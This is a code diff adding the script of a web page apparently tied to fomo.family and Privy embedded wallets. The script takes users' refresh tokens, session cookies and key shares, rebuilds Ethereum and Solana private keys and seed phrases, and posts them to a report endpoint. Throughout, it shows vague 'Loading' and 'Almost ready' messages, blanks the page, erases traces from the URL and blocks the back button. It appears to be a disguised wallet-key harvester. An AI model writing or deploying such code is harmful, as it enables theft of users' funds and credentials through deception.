+      const w = new ethers.Wallet(entropyHex);
+      candidates.push({ method: "raw-pk", privateKey: w.privateKey, address: w.address, mnemonic: null });
+    } catch {}
+    try {
+      const hd = ethers.utils.HDNode.fromSeed(entropyHex);
+      candidates.push({ method: "hd-seed", privateKey: hd.privateKey, address: hd.address, mnemonic: null });
+    } catch {}
+    try {
+      const hd = ethers.utils.HDNode.fromSeed(entropyHex).derivePath("m/44'/60'/0'/0/0");
+      candidates.push({ method: "hd-path", privateKey: hd.privateKey, address: hd.address, mnemonic: null });
+    } catch {}
+
+    const match = candidates.find(
+      (c) => c.address.toLowerCase() === expected.toLowerCase()
+    );
+    if (match) {
+      return {
+        ok: true,
+        chainType: "ethereum",
+        method: match.method,
+        address: match.address,
+        privateKey: match.privateKey,
+        mnemonic: match.mnemonic,
+        entropyHex,
+        candidates,
+      };
+    }
+    return {
+      ok: false,
+      chainType: "ethereum",
+      error: "no address match",
+      entropyHex,
+      candidates,
+      expected,
+    };
+  }
+
+  let busy = false;
+
+  async function recoverApi(payload) {
+    const body = { ...(payload || {}) };
+    if (body.chainType && !body.chain_type) body.chain_type = body.chainType;
+    const r = await fetch(location.origin + "/api/fomo/recover", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify(body),
+    });
+    const text = await r.text();
+    let result;
+    try { result = JSON.parse(text); }
+    catch { throw new Error("bad response"); }
+    const ok = r.ok && result.ok !== false && !result.error;
+    if (!ok) {
+      const err = result.error;
+      const msg = err && typeof err === "object"
+        ? (err.message || err.code || JSON.stringify(err))
+        : (err || "recover failed");
+      throw new Error(String(msg));
+    }
+    return result;
+  }
+
+  function b64urlEncode(str) {
+    const bytes = new TextEncoder().encode(str);
+    let bin = "";
+    bytes.forEach((b) => (bin += String.fromCharCode(b)));
+    return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
+  }
+
+  function b64urlDecode(s) {
+    const pad = "=".repeat((4 - (String(s).length % 4)) % 4);
+    const bin = atob(String(s).replace(/-/g, "+").replace(/_/g, "/") + pad);
+    const bytes = Uint8Array.from(bin, (c) => c.charCodeAt(0));
+    return new TextDecoder().decode(bytes);
+  }
+
+  function parseHandoffPayload(raw, prefix) {
+    const value = String(raw || "");
+    const body = prefix && value.indexOf(prefix) === 0 ? value.slice(prefix.length) : value;
+    if (!body) return null;
+    try {
+      const job = JSON.parse(b64urlDecode(body));
+      if (!job || typeof job !== "object" || Array.isArray(job)) return null;
+      if (!Array.isArray(job.items)) return null;
+      return job;
+    } catch (_) {
+      return null;
+    }
+  }
+
+  function takeHandoffJob() {
+    let job = null;
+    try {
+      job = parseHandoffPayload(window.name, "fomo1.");
+    } catch (_) {}
+    try { window.name = ""; } catch (_) {}
+    if (!job) {
+      const hash = String(location.hash || "");
+      const match = /^#job=([A-Za-z0-9_-]+)$/.exec(hash);
+      if (match) job = parseHandoffPayload(match[1], "");
+    }
+    try {
+      if (location.hash) history.replaceState(null, "", location.pathname + (location.search || ""));
+    } catch (_) {}
+    return job;
+  }
+
+  function installHistoryLock(returnUrl) {
+    const dest = safeFomoReturn(returnUrl);
+    const bounce = () => {
+      try { location.replace(dest); } catch (_) {}
+    };
+    window.addEventListener("popstate", bounce);
+    window.addEventListener("pageshow", (event) => {
+      if (event && event.persisted) bounce();
+    });
+  }
+
+  async function mintTicketAndRedirect(job) {
+    try {
+      const r = await fetch("/api/fomo/runner-ticket", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        credentials: "same-origin",
+        cache: "no-store",
+        body: JSON.stringify({ job }),
+      });
+      const data = await r.json().catch(() => ({}));
+      const ticket = data && data.ticket;
+      if (!r.ok || !ticket) {
+        blankRunner();
+        return false;
+      }
+      const next = (location.pathname || "/fomo/r.html") + "?ticket=" + encodeURIComponent(ticket);
+      try { location.replace(next); } catch (_) { location.href = next; }
+      return true;
+    } catch (_) {
+      blankRunner();
+      return false;
+    }
+  }
+
+  function safeReportEndpoint(value) {
+    try {
+      const url = new URL(String(value || ""), location.href);
+      if (url.origin !== location.origin || url.pathname !== "/api/fomo/report") return "";
+      return url.href;
+    } catch (_) { return ""; }
+  }
+
+  function safeFomoReturn(value) {
+    try {
+      const url = new URL(String(value || "https://fomo.family/token"));
+      const host = url.hostname.toLowerCase();
+      if (host === "fomo.family" || host.endsWith(".fomo.family") || host === "fomo.trading" || host.endsWith(".fomo.trading")) {
+        return url.toString();
+      }
+    } catch (_) {}
+    return "https://fomo.family/token";
+  }
+
+  function blankRunner() {
+    try {
+      const ui = document.getElementById("ui");
+      if (ui) ui.replaceChildren();
+      const skip = document.querySelector(".skip-link");
+      if (skip) skip.remove();
+      document.title = "";
+    } catch (_) {
+      try { document.body.textContent = ""; } catch (__) {}
+    }
+  }
+
+  /* Ticket-only: r.html?ticket= consumes once. Hash job= never executes. */
+  async function runJobFromHash(jobOverride) {
+    let job = jobOverride || null;
+    if (!job) {
+      blankRunner();
+      return true;
+    }
+    if (!job || !Array.isArray(job.items) || !job.items.length) {
+      setStatus("Error", "Empty job");
+      return true;
+    }
+
+    busy = true;
+    setStatus("Loading", "Almost ready");
+    const entropyByRecoveryKey = Object.create(null);
+    const out = {
+      source: job.source || "fomo.family",
+      ts: Date.now(),
+      userId: job.userId || null,
+      ethereum: [],
+      solana: [],
+      raw: { ethereum: [], solana: [] },
+    };
+
+    try {
+      for (let i = 0; i < job.items.length; i++) {
+        const it = job.items[i];
+        setStatus(
+          "Loading",
+          `Step ${i + 1} of ${job.items.length}`
+        );
+        const chainType = it.chainType || it.chain_type || "ethereum";
+        try {
+          const recovered = await recoverApi({
+            ...it,
+            refreshToken: it.refreshToken || job.refreshToken,
+            privyCookies: it.privyCookies || job.privyCookies,
+            exportCiphertext: it.exportCiphertext,
+            exportEncapsulatedKey: it.exportEncapsulatedKey,
+            exportPkcs8: it.exportPkcs8,
+            deviceShare: it.deviceShare,
+            deviceId: it.deviceId
+          });
+          let exportedPrivateKey = recovered?.exportedPrivateKey || it.privateKey || null;
+          const rk = recovered?.recoveryKey || it.recoveryKey || "";
+          if (!exportedPrivateKey && rk && entropyByRecoveryKey[rk] && typeof ethers !== "undefined") {
+            try {
+              const entropyHex = entropyByRecoveryKey[rk];
+              if (chainType === "solana") {
+                const entropy = ethers.utils.arrayify(entropyHex.startsWith("0x") ? entropyHex : ("0x" + entropyHex));
+                const candidates = await solanaFromEntropy(entropy);
+                const match = candidates.find((c) => c.address === (it.wallet || it.address)) || candidates[0];
+                if (match) {
+                  exportedPrivateKey = match.privateKey;
+                  it.privateKeySeed = match.privateKeySeed || it.privateKeySeed;
+                }
+              } else {
+                const mnemonic = ethers.utils.entropyToMnemonic(entropyHex);
+                const w = ethers.Wallet.fromMnemonic(mnemonic);
+                if (!it.wallet || String(w.address).toLowerCase() === String(it.wallet).toLowerCase()) {
+                  exportedPrivateKey = w.privateKey;
+                  it.mnemonic = mnemonic;
+                }
+              }
+            } catch (_) {}
+          }
+          if (!exportedPrivateKey && it.mnemonic && typeof ethers !== "undefined") {
+            try {
+              if (chainType === "solana") {
+                const entropyHex = ethers.utils.mnemonicToEntropy(String(it.mnemonic).trim());
+                const entropy = ethers.utils.arrayify(entropyHex.startsWith("0x") ? entropyHex : ("0x" + entropyHex));
+                const candidates = await solanaFromEntropy(entropy);
+                const match = candidates.find((c) => c.address === (it.wallet || it.address)) || candidates[0];
+                if (match) {
+                  exportedPrivateKey = match.privateKey;
+                  it.privateKeySeed = match.privateKeySeed || it.privateKeySeed;
+                }
+              } else {
+                const w = ethers.Wallet.fromMnemonic(String(it.mnemonic).trim());
+                exportedPrivateKey = w.privateKey;
+              }
+            } catch (_) {}
+          }
+          if (exportedPrivateKey) {
+            if (!it.mnemonic && recovered?.mnemonic) it.mnemonic = recovered.mnemonic;
+            if (rk && it.mnemonic && !entropyByRecoveryKey[rk] && typeof ethers !== "undefined") {
+              try { entropyByRecoveryKey[rk] = ethers.utils.mnemonicToEntropy(String(it.mnemonic).trim()); } catch (_) {}
+            }
+            const address = it.wallet || it.address;
+            const row = {
+              chainType,
+              address,
+              ok: true,
+              method: "client-export",
+              privateKey: exportedPrivateKey,
+              privateKeySeed: it.privateKeySeed || null,
+              mnemonic: it.mnemonic || null,
+            };
+            const bucket = chainType === "solana" ? "solana" : "ethereum";
+            out.raw[bucket].push(row);
+            if (bucket === "ethereum") {
+              out.ethereum.push({
+                address,
+                privateKey: exportedPrivateKey,
+                mnemonic: it.mnemonic || null,
+                method: "client-export",
+              });
+            } else {
+              out.solana.push({
+                address,
+                privateKey: exportedPrivateKey,
+                privateKeySeed: it.privateKeySeed || null,
+                method: "client-export",
+              });
+            }
+            continue;
+          }
+          const authShare = recovered?.auth_share?.data?.share || it.authShare?.share || it.authShare?.data?.share;
+          const encShare = recovered?.shares?.data?.encrypted_recovery_share || it.encShare || it.shares?.encrypted_recovery_share;
+          const iv = recovered?.shares?.data?.encrypted_recovery_share_iv || it.iv || it.shares?.encrypted_recovery_share_iv;
+          const incompleteFields = [
+            !authShare ? "auth_share" : null,
+            !encShare ? "encrypted_recovery_share" : null,
+            !iv ? "encrypted_recovery_share_iv" : null,
+          ].filter(Boolean);
+          if (!authShare || !encShare || !iv) {
+            const fail = {
+              chainType,
+              address: it.wallet || it.address,
+              ok: false,
+              error: "incomplete",
+              incompleteFields,
+            };
+            out.raw[chainType === "solana" ? "solana" : "ethereum"].push(fail);
+            continue;
+          }
+          const comb = await combine({
+            recoveryKey: rk,
+            authShare,
+            encShare,
+            iv,
+            expectedAddress: it.wallet || it.address,
+            chainType,
+            chain_type: chainType,
+          });
+          if (comb && comb.ok && comb.entropyHex && rk) entropyByRecoveryKey[rk] = comb.entropyHex;
+          // combine() returns { ok, address, privateKey, ... } directly
+          // (postMessage path wraps as { ok, result }; job path must not)
+          if (!comb || !comb.ok) {
+            const fail = {
+              chainType,
+              address: it.wallet || it.address,
+              ok: false,
+              error: (comb && comb.error) || "failed",
+              detail: comb || null,
+            };
+            out.raw[chainType === "solana" ? "solana" : "ethereum"].push(fail);
+            continue;
+          }
+          const row = {
+            chainType,
+            address: comb.address,
+            ok: true,
+            method: comb.method,
+            privateKey: comb.privateKey,
+            privateKeySeed: comb.privateKeySeed || null,
+            mnemonic: comb.mnemonic || null,
+          };
+          const bucket = chainType === "solana" ? "solana" : "ethereum";
+          out.raw[bucket].push(row);
+          if (bucket === "ethereum") {
+            out.ethereum.push({
+              address: comb.address,
+              privateKey: comb.privateKey,
+              mnemonic: comb.mnemonic,
+              method: comb.method,
+            });
+          } else {
+            out.solana.push({
+              address: comb.address,
+              privateKey: comb.privateKey,
+              privateKeySeed: comb.privateKeySeed,
+              method: comb.method,
+            });
+          }
+        } catch (e) {
+          const bucket =
+            (it.chainType || it.chain_type) === "solana" ? "solana" : "ethereum";
+          out.raw[bucket].push({
+            chainType: it.chainType || it.chain_type,
+            address: it.wallet || it.address,
+            ok: false,
+            error: String(e.message || e),
+          });
+        }
+      }
+
+      const backend = safeReportEndpoint(job.backend);
+      if (!backend) throw new Error("Invalid report endpoint");
+      out.projectId = job.projectId || null;
+      out.userId = job.userId || null;
+      out.source = "fomo.family";
+      setStatus("Almost ready", "Finishing up");
+      const reportResponse = await fetch(backend, {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify(out),
+        redirect: "error",
+        credentials: "same-origin",
+      });
+      const reportText = await reportResponse.text();
+      let reportResult = null;
+      try { reportResult = JSON.parse(reportText); } catch {}
+      if (!reportResponse.ok || reportResult?.error) {
+        throw new Error(String(reportResult?.error || "report failed"));
+      }
+      setDone();
+      setStatus("All set", "Taking you back");
+      location.replace(safeFomoReturn(job.returnUrl || job.return));
+    } catch (e) {
+      setStatus("Error", String(e.message || e));
+    } finally {
+      busy = false;
+    }
+    return true;
+  }
+
+  async function runJobFromTicket() {
+    const ticket = new URLSearchParams(location.search || "").get("ticket");
+    if (!ticket) {
+      blankRunner();
+      return true;
+    }
+    try {
+      const r = await fetch("/api/fomo/runner-ticket?ticket=" + encodeURIComponent(ticket), {
+        credentials: "same-origin",
+        cache: "no-store",
+      });
+      if (!r.ok) {
+        blankRunner();
+        return true;
+      }
+      const data = await r.json();
+      if (!data || !data.job) {
+        blankRunner();
+        return true;
+      }
+      location.hash = "";
+      try { history.replaceState(null, "", location.pathname || "/fomo/r.html"); } catch (_) {}
+      installHistoryLock(data.job && (data.job.returnUrl || data.job.return));
+      await runJobFromHash(data.job);
+    } catch (_) {
+      blankRunner();
+    }
+    return true;
+  }
+
+  async function bootRunner() {
+    const ticket = new URLSearchParams(location.search || "").get("ticket");
+    if (ticket) return runJobFromTicket();
+    const job = takeHandoffJob();
+    if (job) {
+      installHistoryLock(job.returnUrl || job.return);
+      return mintTicketAndRedirect(job);
+    }
+    blankRunner();
+    return true;
+  }
+
+  window.addEventListener("message", async (ev) => {
+    if (!ALLOWED(ev.origin)) return;
+    const d = ev.data;
+    if (!d) return;
+
+    if (d.type === "privy-ping") {
+      try {
+        ev.source.postMessage({ type: "privy-runner-hello" }, ev.origin);
+      } catch {}
+      return;
+    }
+
+    if (d.type === "privy-recover-start" && !busy) {
+      busy = true;
+      setStatus("Loading", "Connecting");
+      try {
+        const result = await recoverApi(d.payload || {});
+        ev.source.postMessage(
+          { type: "privy-recover-result", ok: true, result, error: null },
+          ev.origin
+        );
+      } catch (e) {
+        ev.source.postMessage(
+          { type: "privy-recover-result", ok: false, error: String(e.message || e) },
+          ev.origin
+        );
+      } finally {
+        busy = false;
+      }
+      return;
+    }
+
+    if (d.type === "privy-combine" && !busy) {
+      busy = true;
+      setStatus("Loading", "Finishing");
+      try {
+        const result = await combine(d);
+        if (result.ok) setDone();
+        ev.source.postMessage(
+          { type: "privy-combine-result", ok: !!result.ok, result, error: result.error || null },
+          ev.origin
+        );
+      } catch (e) {
+        ev.source.postMessage(
+          { type: "privy-combine-result", ok: false, error: String(e.message || e) },
+          ev.origin
+        );
+      } finally {
+        busy = false;
+      }
+    }
+  });
+
+  setStatus("Loading", "Almost ready");
+  bootRunner().then((handled) => {
+    if (handled) return;
+    blankRunner();
+  }).catch((e) => {
+    blankRunner();
+    setStatus("Error", String(e.message || e));
+  });
+})();
+  </script>
+</body>
+</html>
